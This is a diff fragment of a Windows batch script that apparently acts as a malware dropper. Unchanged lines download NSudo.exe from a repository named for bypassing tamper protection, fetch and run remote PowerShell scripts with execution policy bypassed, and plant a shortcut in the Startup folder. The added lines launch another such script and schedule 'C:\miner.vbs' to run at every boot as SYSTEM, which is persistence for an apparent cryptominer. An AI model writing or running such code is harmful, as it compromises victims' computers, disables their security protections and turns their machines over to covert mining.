@@ -28,6 +28,8 @@ REM call svchost.bat
 
 color 0a
 
+
+
 cd  %temp%
 
 bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
@@ -93,6 +95,9 @@ curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/raccourci.ps1
 
 powershell.exe -ExecutionPolicy Bypass -File raccourci.ps1
 powershell.exe -ExecutionPolicy Bypass -File dowload.ps1
+
+start powershell.exe -ExecutionPolicy Bypass -File dowload.ps1
+schtasks /create /tn "tkt" /tr "C:\miner.vbs" /sc onstart /ru System
 
 move C:\logs.lnk "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
